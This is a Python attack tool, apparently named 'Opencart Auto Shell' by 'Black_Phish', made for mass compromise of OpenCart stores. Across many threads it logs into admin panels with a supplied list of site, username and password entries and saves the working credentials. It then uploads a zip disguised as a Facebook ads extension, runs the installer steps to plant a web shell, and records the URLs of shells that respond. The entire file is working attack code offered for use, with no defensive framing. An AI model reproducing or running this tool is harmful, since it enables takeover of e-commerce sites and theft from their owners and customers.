import os,re
try:
	import requests
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
	exit()
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
os.system(['clear', 'cls'][(os.name == 'nt')])
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
				executor.map(check,list)
		except Exception as e:
			pass
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
red = '\x1b[31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
def OpencartAutoShell(site,sess,splitx,sourcecode,tok):
	try:
		token = re.findall(splitx,sourcecode)[0].split('"')[0]
		try:
			url = site+'/admin/index.php?route=marketplace/installer/upload&'+tok+token
			files = {'file': ('facebook_ads_extension.ocmod.zip',open('files/black.zip', 'rb'))}
			try:
				shell = sess.post('http://'+url,files=files,headers=headers,timeout=10,verify=False)
			except:
				shell = sess.post('http://'+url,files=files,headers=headers,timeout=10,verify=False)
			try:
				nx = str(shell.content.decode("utf-8")).split('extension_install_id=')[1].split('"}')[0]
			except Exception as e:
				return rez(site,'ShellUpload',"5")
			try:
				st1 = url.replace('marketplace/installer/upload', 'marketplace/install/install')+'&extension_install_id='+nx
				sess.post('http://'+st1,headers=headers,timeout=10,verify=False)
			except:
				st1 = url.replace('marketplace/installer/upload', 'marketplace/install/install')+'&extension_install_id='+nx
				sess.post('http://'+st1,headers=headers,timeout=10,verify=False)
			try:
				st2 = st1.replace('marketplace/install/install','marketplace/install/unzip')
				sess.post('http://'+st2,headers=headers,timeout=10,verify=False)
			except:
				st2 = st1.replace('marketplace/install/install','marketplace/install/unzip')
				sess.post('http://'+st2,headers=headers,timeout=10,verify=False)
			try:
				st3 = st1.replace('marketplace/install/install','marketplace/install/move')
				sess.post('http://'+st3,headers=headers,timeout=10,verify=False)
			except:
				st3 = st1.replace('marketplace/install/install','marketplace/install/move')
				sess.post('http://'+st3,headers=headers,timeout=10,verify=False)
			try:
				st4 = st1.replace('marketplace/install/install','marketplace/install/xml')
				sess.post('http://'+st4,headers=headers,timeout=10,verify=False)
			except:
				st4 = st1.replace('marketplace/install/install','marketplace/install/xml')
				sess.post('http://'+st4,headers=headers,timeout=10,verify=False)
			try:
				st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
				sess.post('http://'+st5,headers=headers,timeout=10,verify=False)
			except:
				st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
				sess.post('http://'+st5,headers=headers,timeout=10,verify=False)
			try:
				shellcheck = requests.get("http://"+site+"/admin/controller/extension/facebookproductfeed.php",headers=headers,timeout=10,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get("http://"+site+"/admin/controller/extension/facebookproductfeed.php",headers=headers,timeout=10,verify=False).content.decode("utf-8")
			if 'Black_Phish' in shellcheck:
				rez(site+'/admin/controller/extension/facebookproductfeed.php','ShellUpload','1')
				try:
					with open("result/shells.txt","a") as wr:
						wr.write(site+'/admin/controller/extension/facebookproductfeed.php\n')
				except:
					pass
			else:
				rez(site,'ShellUpload','no')
		except Exception as e:
			pass
	except Exception as e:
		pass
def OpencartLogin(site,username,passwd):
	try:
		data = {'username': username,'password': passwd}
		url = 'http://'+site+'/admin/index.php?route=common/login'
		sess = requests.session()
		try:
			login = sess.post(url,data=data,headers=headers,timeout=10,verify=False)
		except:
			login = sess.post(url,data=data,headers=headers,timeout=10,verify=False)
		chkk = login.content.decode("utf-8")
		if 'user_token=' in chkk and "type='password'" not in (chkk.lower()).replace('"',"'"):
			rez(site,'TryingAutoShell','1')
			with open('result/Login_Success.txt','a') as w:
				w.write('http://'+site+ '/admin/index.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
			OpencartAutoShell(site,sess,';user_token=(.*)">',chkk,'user_token=')
		elif 'token=' in chkk and "type='password'" not in (chkk.lower()).replace('"',"'"):
			rez(site,'TryingAutoShell','1')
			with open('result/Login_Success.txt','a') as w:
				w.write('http://'+site+ '/admin/index.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
			OpencartAutoShell(site,sess,';token=(.*)">',chkk,'token=')
		else:
			rez(site,'Login','&')
			with open('result/Login_failed.txt','a') as w:
				w.write(site+'\n')
	except Exception as e:
		rez(site,'Connection','5')
def Scan(url):
	try:
		url = url.replace("https://","")
		url = url.replace("http://","")
		cut = url.split('/admin/index.php')
		site = cut[0]
		cut2 = cut[1].split("#")
		username = cut2[1]
		passwd = cut2[2]
		OpencartLogin(site,username,passwd)
	except Exception as e:
		print(e)
try:
	print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}Opencart Auto Shell [site.com#user#pass]\n""".format(y,c,y,c))
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Threads"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
	os.system(['clear', 'cls'][(os.name == 'nt')])
	SpeedX(Scan,dork,th)
except:
	os.system(['clear', 'cls'][(os.name == 'nt')])
	print(" [+] Please Give Valid Input!")
	exit()